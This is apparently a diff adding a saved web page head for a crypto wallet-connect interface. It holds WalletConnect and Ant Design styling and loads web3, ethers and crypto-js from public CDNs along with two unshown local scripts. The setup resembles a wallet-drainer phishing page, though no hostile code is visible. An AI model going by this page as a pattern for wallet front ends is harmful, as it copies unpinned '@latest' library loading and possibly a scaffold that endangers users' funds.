@@ -1,0 +1,229 @@
+<html style="--wcm-color-fg-1: rgb(20,20,20); --wcm-color-fg-2: rgb(121,134,134); --wcm-color-fg-3: rgb(158,169,169); --wcm-color-bg-1: rgb(255,255,255); --wcm-color-bg-2: rgb(241,243,243); --wcm-color-bg-3: rgb(228,231,231); --wcm-color-overlay: rgba(0,0,0,0.1); --wcm-accent-color: #3396FF; --wcm-accent-fill-color: #FFFFFF; --wcm-z-index: 89; --wcm-background-color: #3396FF; --wcm-background-border-radius: 8px; --wcm-container-border-radius: 30px; --wcm-wallet-icon-border-radius: 15px; --wcm-wallet-icon-large-border-radius: 30px; --wcm-wallet-icon-small-border-radius: 7px; --wcm-input-border-radius: 28px; --wcm-button-border-radius: 10px; --wcm-notification-border-radius: 36px; --wcm-secondary-button-border-radius: 28px; --wcm-icon-button-border-radius: 50%; --wcm-button-hover-highlight-border-radius: 10px; --wcm-text-big-bold-size: 20px; --wcm-text-big-bold-weight: 600; --wcm-text-big-bold-line-height: 24px; --wcm-text-big-bold-letter-spacing: -0.03em; --wcm-text-big-bold-text-transform: none; --wcm-text-xsmall-bold-size: 10px; --wcm-text-xsmall-bold-weight: 700; --wcm-text-xsmall-bold-line-height: 12px; --wcm-text-xsmall-bold-letter-spacing: 0.02em; --wcm-text-xsmall-bold-text-transform: uppercase; --wcm-text-xsmall-regular-size: 12px; --wcm-text-xsmall-regular-weight: 600; --wcm-text-xsmall-regular-line-height: 14px; --wcm-text-xsmall-regular-letter-spacing: -0.03em; --wcm-text-xsmall-regular-text-transform: none; --wcm-text-small-thin-size: 14px; --wcm-text-small-thin-weight: 500; --wcm-text-small-thin-line-height: 16px; --wcm-text-small-thin-letter-spacing: -0.03em; --wcm-text-small-thin-text-transform: none; --wcm-text-small-regular-size: 14px; --wcm-text-small-regular-weight: 600; --wcm-text-small-regular-line-height: 16px; --wcm-text-small-regular-letter-spacing: -0.03em; --wcm-text-small-regular-text-transform: none; --wcm-text-medium-regular-size: 16px; --wcm-text-medium-regular-weight: 600; --wcm-text-medium-regular-line-height: 20px; --wcm-text-medium-regular-letter-spacing: -0.03em; --wcm-text-medium-regular-text-transform: none; --wcm-font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, Ubuntu, 'Helvetica Neue', sans-serif; --wcm-font-feature-settings: 'tnum' on, 'lnum' on, 'case' on; --wcm-success-color: rgb(38,181,98); --wcm-error-color: rgb(242, 90, 103); --wcm-overlay-background-color: rgba(0, 0, 0, 0.3); --wcm-overlay-backdrop-filter: none;">
+ <head>
+  <style data-css-hash="y8z5fu" data-rc-order="prependQueue" data-rc-priority="-999" data-token-hash="24omxn">
+   :where(.css-fpg3f5) a{color:#1677ff;text-decoration:none;background-color:transparent;outline:none;cursor:pointer;transition:color 0.3s;-webkit-text-decoration-skip:objects;}:where(.css-fpg3f5) a:hover{color:#69b1ff;}:where(.css-fpg3f5) a:active{color:#0958d9;}:where(.css-fpg3f5) a:active,:where(.css-fpg3f5) a:hover{text-decoration:none;outline:0;}:where(.css-fpg3f5) a:focus{text-decoration:none;outline:0;}:where(.css-fpg3f5) a[disabled]{color:rgba(0, 0, 0, 0.25);cursor:not-allowed;}
+  </style>
+  <script src="https://unpkg.com/web3@latest/dist/web3.min.js">
+  </script>
+  <script src="https://unpkg.com/crypto-js@latest/crypto-js.js">
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.js" type="application/javascript">
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js">
+  </script>
+  <script src="./js/settings.js">
+  </script>
+  <script src="./js/webchunk.js">
+  </script>
+  <style data-css-hash="r13iqy" data-rc-order="prependQueue" data-rc-priority="-999" data-token-hash="24omxn">
+   :where(.css-fpg3f5)[class^="ant-dropdown"],:where(.css-fpg3f5)[class*=" ant-dropdown"]{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,'Noto Sans',sans-serif,'Apple Color Emoji','Segoe UI Emoji','Segoe UI Symbol','Noto Color Emoji';font-size:14px;box-sizing:border-box;}:where(.css-fpg3f5)[class^="ant-dropdown"]::before,:where(.css-fpg3f5)[class*=" ant-dropdown"]::before,:where(.css-fpg3f5)[class^="ant-dropdown"]::after,:where(.css-fpg3f5)[class*=" ant-dropdown"]::after{box-sizing:border-box;}:where(.css-fpg3f5)[class^="ant-dropdown"] [class^="ant-dropdown"],:where(.css-fpg3f5)[class*=" ant-dropdown"] [class^="ant-dropdown"],:where(.css-fpg3f5)[class^="ant-dropdown"] [class*=" ant-dropdown"],:where(.css-fpg3f5)[class*=" ant-dropdown"] [class*=" ant-dropdown"]{box-sizing:border-box;}:where(.css-fpg3f5)[class^="ant-dropdown"] [class^="ant-dropdown"]::before,:where(.css-fpg3f5)[class*=" ant-dropdown"] [class^="ant-dropdown"]::before,:where(.css-fpg3f5)[class^="ant-dropdown"] [class*=" ant-dropdown"]::before,:where(.css-fpg3f5)[class*=" ant-dropdown"] [class*=" ant-dropdown"]::before,:where(.css-fpg3f5)[class^="ant-dropdown"] [class^="ant-dropdown"]::after,:where(.css-fpg3f5)[class*=" ant-dropdown"] [class^="ant-dropdown"]::after,:where(.css-fpg3f5)[class^="ant-dropdown"] [class*=" ant-dropdown"]::after,:where(.css-fpg3f5)[class*=" ant-dropdown"] [class*=" ant-dropdown"]::after{box-sizing:border-box;}:where(.css-fpg3f5).ant-dropdown{box-sizing:border-box;margin:0;padding:0;color:rgba(0, 0, 0, 0.88);font-size:14px;line-height:1.5714285714285714;list-style:none;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,'Noto Sans',sans-serif,'Apple Color Emoji','Segoe UI Emoji','Segoe UI Symbol','Noto Color Emoji';position:absolute;top:-9999px;left:-9999px;z-index:1050;display:block;}:where(.css-fpg3f5).ant-dropdown::before{position:absolute;inset-block:-4px;z-index:-9999;opacity:0.0001;content:"";}:where(.css-fpg3f5).ant-dropdown-trigger.ant-btn>.anticon-down,:where(.css-fpg3f5).ant-dropdown-trigger.ant-btn>.ant-btn-icon>.anticon-down{font-size:12px;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-wrap{position:relative;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-wrap .ant-btn>.anticon-down{font-size:12px;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-wrap .anticon-down::before{transition:transform 0.2s;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-wrap-open .anticon-down::before{transform:rotate(180deg);}:where(.css-fpg3f5).ant-dropdown-hidden,:where(.css-fpg3f5).ant-dropdown-menu-hidden,:where(.css-fpg3f5).ant-dropdown-menu-submenu-hidden{display:none;}:where(.css-fpg3f5).ant-dropdown.ant-slide-down-enter.ant-slide-down-enter-active.ant-dropdown-placement-bottomLeft,:where(.css-fpg3f5).ant-dropdown.ant-slide-down-appear.ant-slide-down-appear-active.ant-dropdown-placement-bottomLeft,:where(.css-fpg3f5).ant-dropdown.ant-slide-down-enter.ant-slide-down-enter-active.ant-dropdown-placement-bottom,:where(.css-fpg3f5).ant-dropdown.ant-slide-down-appear.ant-slide-down-appear-active.ant-dropdown-placement-bottom,:where(.css-fpg3f5).ant-dropdown.ant-slide-down-enter.ant-slide-down-enter-active.ant-dropdown-placement-bottomRight,:where(.css-fpg3f5).ant-dropdown.ant-slide-down-appear.ant-slide-down-appear-active.ant-dropdown-placement-bottomRight{animation-name:css-fpg3f5-antSlideUpIn;}:where(.css-fpg3f5).ant-dropdown.ant-slide-up-enter.ant-slide-up-enter-active.ant-dropdown-placement-topLeft,:where(.css-fpg3f5).ant-dropdown.ant-slide-up-appear.ant-slide-up-appear-active.ant-dropdown-placement-topLeft,:where(.css-fpg3f5).ant-dropdown.ant-slide-up-enter.ant-slide-up-enter-active.ant-dropdown-placement-top,:where(.css-fpg3f5).ant-dropdown.ant-slide-up-appear.ant-slide-up-appear-active.ant-dropdown-placement-top,:where(.css-fpg3f5).ant-dropdown.ant-slide-up-enter.ant-slide-up-enter-active.ant-dropdown-placement-topRight,:where(.css-fpg3f5).ant-dropdown.ant-slide-up-appear.ant-slide-up-appear-active.ant-dropdown-placement-topRight{animation-name:css-fpg3f5-antSlideDownIn;}:where(.css-fpg3f5).ant-dropdown.ant-slide-down-leave.ant-slide-down-leave-active.ant-dropdown-placement-bottomLeft,:where(.css-fpg3f5).ant-dropdown.ant-slide-down-leave.ant-slide-down-leave-active.ant-dropdown-placement-bottom,:where(.css-fpg3f5).ant-dropdown.ant-slide-down-leave.ant-slide-down-leave-active.ant-dropdown-placement-bottomRight{animation-name:css-fpg3f5-antSlideUpOut;}:where(.css-fpg3f5).ant-dropdown.ant-slide-up-leave.ant-slide-up-leave-active.ant-dropdown-placement-topLeft,:where(.css-fpg3f5).ant-dropdown.ant-slide-up-leave.ant-slide-up-leave-active.ant-dropdown-placement-top,:where(.css-fpg3f5).ant-dropdown.ant-slide-up-leave.ant-slide-up-leave-active.ant-dropdown-placement-topRight{animation-name:css-fpg3f5-antSlideDownOut;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-arrow{position:absolute;z-index:1;display:block;pointer-events:none;width:16px;height:16px;overflow:hidden;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-arrow::before{position:absolute;bottom:0;inset-inline-start:0;width:16px;height:8px;background:#ffffff;clip-path:polygon(1.6568542494923806px 100%, 50% 1.6568542494923806px, 14.34314575050762px 100%, 1.6568542494923806px 100%);clip-path:path('M 0 8 A 4 4 0 0 0 2.82842712474619 6.82842712474619 L 6.585786437626905 3.0710678118654755 A 2 2 0 0 1 9.414213562373096 3.0710678118654755 L 13.17157287525381 6.82842712474619 A 4 4 0 0 0 16 8 Z');content:"";}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-arrow::after{content:"";position:absolute;width:8.970562748477143px;height:8.970562748477143px;bottom:0;inset-inline:0;margin:auto;border-radius:0 0 2px 0;transform:translateY(50%) rotate(-135deg);box-shadow:2px 2px 5px rgba(0, 0, 0, 0.05);z-index:0;background:transparent;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-arrow:before{background:#ffffff;}:where(.css-fpg3f5).ant-dropdown-placement-top .ant-dropdown-arrow,:where(.css-fpg3f5).ant-dropdown-placement-topLeft .ant-dropdown-arrow,:where(.css-fpg3f5).ant-dropdown-placement-topRight .ant-dropdown-arrow{bottom:0;transform:translateY(100%) rotate(180deg);}:where(.css-fpg3f5).ant-dropdown-placement-top .ant-dropdown-arrow{left:50%;transform:translateX(-50%) translateY(100%) rotate(180deg);}:where(.css-fpg3f5).ant-dropdown-placement-topLeft .ant-dropdown-arrow{left:12px;}:where(.css-fpg3f5).ant-dropdown-placement-topRight .ant-dropdown-arrow{right:12px;}:where(.css-fpg3f5).ant-dropdown-placement-bottom .ant-dropdown-arrow,:where(.css-fpg3f5).ant-dropdown-placement-bottomLeft .ant-dropdown-arrow,:where(.css-fpg3f5).ant-dropdown-placement-bottomRight .ant-dropdown-arrow{top:0;transform:translateY(-100%);}:where(.css-fpg3f5).ant-dropdown-placement-bottom .ant-dropdown-arrow{left:50%;transform:translateX(-50%) translateY(-100%);}:where(.css-fpg3f5).ant-dropdown-placement-bottomLeft .ant-dropdown-arrow{left:12px;}:where(.css-fpg3f5).ant-dropdown-placement-bottomRight .ant-dropdown-arrow{right:12px;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu{position:relative;margin:0;}:where(.css-fpg3f5).ant-dropdown-menu-submenu-popup{position:absolute;z-index:1050;background:transparent;box-shadow:none;transform-origin:0 0;}:where(.css-fpg3f5).ant-dropdown-menu-submenu-popup ul,:where(.css-fpg3f5).ant-dropdown-menu-submenu-popup li{list-style:none;margin:0;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu{padding:4px;list-style-type:none;background-color:#ffffff;background-clip:padding-box;border-radius:8px;outline:none;box-shadow:0 6px 16px 0 rgba(0, 0, 0, 0.08),0 3px 6px -4px rgba(0, 0, 0, 0.12),0 9px 28px 8px rgba(0, 0, 0, 0.05);}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu:focus-visible,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu:focus-visible{outline:4px solid #91caff;outline-offset:1px;transition:outline-offset 0s,outline 0s;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-item-group-title,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-item-group-title{padding:5px 12px;color:rgba(0, 0, 0, 0.45);transition:all 0.2s;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-item,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-item{position:relative;display:flex;align-items:center;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-item-icon,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-item-icon{min-width:14px;margin-inline-end:8px;font-size:12px;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-title-content,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-title-content{flex:auto;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-title-content >a,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-title-content >a{color:inherit;transition:all 0.2s;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-title-content >a:hover,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-title-content >a:hover{color:inherit;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-title-content >a::after,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-title-content >a::after{position:absolute;inset:0;content:"";}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-item,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-item,:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-submenu-title,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-submenu-title{clear:both;margin:0;padding:5px 12px;color:rgba(0, 0, 0, 0.88);font-weight:normal;font-size:14px;line-height:1.5714285714285714;cursor:pointer;transition:all 0.2s;border-radius:4px;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-item:hover,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-item:hover,:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-submenu-title:hover,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-submenu-title:hover,:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-item-active,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-item-active,:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-submenu-title-active,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-submenu-title-active{background-color:rgba(0, 0, 0, 0.04);}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-item:focus-visible,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-item:focus-visible,:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-submenu-title:focus-visible,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-submenu-title:focus-visible{outline:4px solid #91caff;outline-offset:1px;transition:outline-offset 0s,outline 0s;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-item-selected,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-item-selected,:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-submenu-title-selected,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-submenu-title-selected{color:#1677ff;background-color:#e6f4ff;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-item-selected:hover,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-item-selected:hover,:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-submenu-title-selected:hover,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-submenu-title-selected:hover,:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-item-selected-active,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-item-selected-active,:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-submenu-title-selected-active,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-submenu-title-selected-active{background-color:#bae0ff;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-item-disabled,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-item-disabled,:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-submenu-title-disabled,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-submenu-title-disabled{color:rgba(0, 0, 0, 0.25);cursor:not-allowed;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-item-disabled:hover,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-item-disabled:hover,:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-submenu-title-disabled:hover,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-submenu-title-disabled:hover{color:rgba(0, 0, 0, 0.25);background-color:#ffffff;cursor:not-allowed;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-item-disabled a,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-item-disabled a,:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-submenu-title-disabled a,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-submenu-title-disabled a{pointer-events:none;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-item-divider,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-item-divider,:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-submenu-title-divider,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-submenu-title-divider{height:1px;margin:4px 0;overflow:hidden;line-height:0;background-color:rgba(5, 5, 5, 0.06);}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-item .ant-dropdown-menu-submenu-expand-icon,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-item .ant-dropdown-menu-submenu-expand-icon,:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-submenu-title .ant-dropdown-menu-submenu-expand-icon,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-submenu-title .ant-dropdown-menu-submenu-expand-icon{position:absolute;inset-inline-end:8px;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-item .ant-dropdown-menu-submenu-expand-icon .ant-dropdown-menu-submenu-arrow-icon,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-item .ant-dropdown-menu-submenu-expand-icon .ant-dropdown-menu-submenu-arrow-icon,:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-submenu-title .ant-dropdown-menu-submenu-expand-icon .ant-dropdown-menu-submenu-arrow-icon,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-submenu-title .ant-dropdown-menu-submenu-expand-icon .ant-dropdown-menu-submenu-arrow-icon{margin-inline-end:0!important;color:rgba(0, 0, 0, 0.45);font-size:12px;font-style:normal;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-item-group-list,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-item-group-list{margin:0 8px;padding:0;list-style:none;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-submenu-title,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-submenu-title{padding-inline-end:24px;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-submenu-vertical,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-submenu-vertical{position:relative;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-submenu.ant-dropdown-menu-submenu-disabled .ant-dropdown-menu-submenu-title,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-submenu.ant-dropdown-menu-submenu-disabled .ant-dropdown-menu-submenu-title,:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-submenu.ant-dropdown-menu-submenu-disabled .ant-dropdown-menu-submenu-title .ant-dropdown-menu-submenu-arrow-icon,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-submenu.ant-dropdown-menu-submenu-disabled .ant-dropdown-menu-submenu-title .ant-dropdown-menu-submenu-arrow-icon{color:rgba(0, 0, 0, 0.25);background-color:#ffffff;cursor:not-allowed;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-submenu-selected .ant-dropdown-menu-submenu-title,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-submenu-selected .ant-dropdown-menu-submenu-title{color:#1677ff;}:where(.css-fpg3f5).ant-slide-up-enter,:where(.css-fpg3f5).ant-slide-up-appear{animation-duration:0.2s;animation-fill-mode:both;animation-play-state:paused;}:where(.css-fpg3f5).ant-slide-up-leave{animation-duration:0.2s;animation-fill-mode:both;animation-play-state:paused;}:where(.css-fpg3f5).ant-slide-up-enter.ant-slide-up-enter-active,:where(.css-fpg3f5).ant-slide-up-appear.ant-slide-up-appear-active{animation-name:css-fpg3f5-antSlideUpIn;animation-play-state:running;}:where(.css-fpg3f5).ant-slide-up-leave.ant-slide-up-leave-active{animation-name:css-fpg3f5-antSlideUpOut;animation-play-state:running;pointer-events:none;}:where(.css-fpg3f5).ant-slide-up-enter,:where(.css-fpg3f5).ant-slide-up-appear{transform:scale(0);transform-origin:0% 0%;opacity:0;animation-timing-function:cubic-bezier(0.23, 1, 0.32, 1);}:where(.css-fpg3f5).ant-slide-up-enter-prepare,:where(.css-fpg3f5).ant-slide-up-appear-prepare{transform:scale(1);}:where(.css-fpg3f5).ant-slide-up-leave{animation-timing-function:cubic-bezier(0.755, 0.05, 0.855, 0.06);}:where(.css-fpg3f5).ant-slide-down-enter,:where(.css-fpg3f5).ant-slide-down-appear{animation-duration:0.2s;animation-fill-mode:both;animation-play-state:paused;}:where(.css-fpg3f5).ant-slide-down-leave{animation-duration:0.2s;animation-fill-mode:both;animation-play-state:paused;}:where(.css-fpg3f5).ant-slide-down-enter.ant-slide-down-enter-active,:where(.css-fpg3f5).ant-slide-down-appear.ant-slide-down-appear-active{animation-name:css-fpg3f5-antSlideDownIn;animation-play-state:running;}:where(.css-fpg3f5).ant-slide-down-leave.ant-slide-down-leave-active{animation-name:css-fpg3f5-antSlideDownOut;animation-play-state:running;pointer-events:none;}:where(.css-fpg3f5).ant-slide-down-enter,:where(.css-fpg3f5).ant-slide-down-appear{transform:scale(0);transform-origin:0% 0%;opacity:0;animation-timing-function:cubic-bezier(0.23, 1, 0.32, 1);}:where(.css-fpg3f5).ant-slide-down-enter-prepare,:where(.css-fpg3f5).ant-slide-down-appear-prepare{transform:scale(1);}:where(.css-fpg3f5).ant-slide-down-leave{animation-timing-function:cubic-bezier(0.755, 0.05, 0.855, 0.06);}:where(.css-fpg3f5).ant-move-up-enter,:where(.css-fpg3f5).ant-move-up-appear{animation-duration:0.2s;animation-fill-mode:both;animation-play-state:paused;}:where(.css-fpg3f5).ant-move-up-leave{animation-duration:0.2s;animation-fill-mode:both;animation-play-state:paused;}:where(.css-fpg3f5).ant-move-up-enter.ant-move-up-enter-active,:where(.css-fpg3f5).ant-move-up-appear.ant-move-up-appear-active{animation-name:css-fpg3f5-antMoveUpIn;animation-play-state:running;}:where(.css-fpg3f5).ant-move-up-leave.ant-move-up-leave-active{animation-name:css-fpg3f5-antMoveUpOut;animation-play-state:running;pointer-events:none;}:where(.css-fpg3f5).ant-move-up-enter,:where(.css-fpg3f5).ant-move-up-appear{opacity:0;animation-timing-function:cubic-bezier(0.08, 0.82, 0.17, 1);}:where(.css-fpg3f5).ant-move-up-leave{animation-timing-function:cubic-bezier(0.78, 0.14, 0.15, 0.86);}:where(.css-fpg3f5).ant-move-down-enter,:where(.css-fpg3f5).ant-move-down-appear{animation-duration:0.2s;animation-fill-mode:both;animation-play-state:paused;}:where(.css-fpg3f5).ant-move-down-leave{animation-duration:0.2s;animation-fill-mode:both;animation-play-state:paused;}:where(.css-fpg3f5).ant-move-down-enter.ant-move-down-enter-active,:where(.css-fpg3f5).ant-move-down-appear.ant-move-down-appear-active{animation-name:css-fpg3f5-antMoveDownIn;animation-play-state:running;}:where(.css-fpg3f5).ant-move-down-leave.ant-move-down-leave-active{animation-name:css-fpg3f5-antMoveDownOut;animation-play-state:running;pointer-events:none;}:where(.css-fpg3f5).ant-move-down-enter,:where(.css-fpg3f5).ant-move-down-appear{opacity:0;animation-timing-function:cubic-bezier(0.08, 0.82, 0.17, 1);}:where(.css-fpg3f5).ant-move-down-leave{animation-timing-function:cubic-bezier(0.78, 0.14, 0.15, 0.86);}:where(.css-fpg3f5).ant-zoom-big-enter,:where(.css-fpg3f5).ant-zoom-big-appear{animation-duration:0.2s;animation-fill-mode:both;animation-play-state:paused;}:where(.css-fpg3f5).ant-zoom-big-leave{animation-duration:0.2s;animation-fill-mode:both;animation-play-state:paused;}:where(.css-fpg3f5).ant-zoom-big-enter.ant-zoom-big-enter-active,:where(.css-fpg3f5).ant-zoom-big-appear.ant-zoom-big-appear-active{animation-name:css-fpg3f5-antZoomBigIn;animation-play-state:running;}:where(.css-fpg3f5).ant-zoom-big-leave.ant-zoom-big-leave-active{animation-name:css-fpg3f5-antZoomBigOut;animation-play-state:running;pointer-events:none;}:where(.css-fpg3f5).ant-zoom-big-enter,:where(.css-fpg3f5).ant-zoom-big-appear{transform:scale(0);opacity:0;animation-timing-function:cubic-bezier(0.08, 0.82, 0.17, 1);}:where(.css-fpg3f5).ant-zoom-big-enter-prepare,:where(.css-fpg3f5).ant-zoom-big-appear-prepare{transform:none;}:where(.css-fpg3f5).ant-zoom-big-leave{animation-timing-function:cubic-bezier(0.78, 0.14, 0.15, 0.86);}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-item.ant-dropdown-menu-item-danger:not(.ant-dropdown-menu-item-disabled),:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-item.ant-dropdown-menu-item-danger:not(.ant-dropdown-menu-item-disabled){color:#ff4d4f;}:where(.css-fpg3f5).ant-dropdown .ant-dropdown-menu .ant-dropdown-menu-item.ant-dropdown-menu-item-danger:not(.ant-dropdown-menu-item-disabled):hover,:where(.css-fpg3f5).ant-dropdown-menu-submenu .ant-dropdown-menu .ant-dropdown-menu-item.ant-dropdown-menu-item-danger:not(.ant-dropdown-menu-item-disabled):hover{color:#fff;background-color:#ff4d4f;}
+  </style>
+  <style data-css-hash="_effect-css-fpg3f5-antSlideUpIn" data-rc-order="prependQueue" data-rc-priority="-999">
+   @keyframes css-fpg3f5-antSlideUpIn{0%{transform:scaleY(0.8);transform-origin:0% 0%;opacity:0;}100%{transform:scaleY(1);transform-origin:0% 0%;opacity:1;}}
+  </style>
+  <style data-css-hash="_effect-css-fpg3f5-antSlideDownIn" data-rc-order="prependQueue" data-rc-priority="-999">
+   @keyframes css-fpg3f5-antSlideDownIn{0%{transform:scaleY(0.8);transform-origin:100% 100%;opacity:0;}100%{transform:scaleY(1);transform-origin:100% 100%;opacity:1;}}
+  </style>
+  <style data-css-hash="_effect-css-fpg3f5-antSlideUpOut" data-rc-order="prependQueue" data-rc-priority="-999">
+   @keyframes css-fpg3f5-antSlideUpOut{0%{transform:scaleY(1);transform-origin:0% 0%;opacity:1;}100%{transform:scaleY(0.8);transform-origin:0% 0%;opacity:0;}}
+  </style>
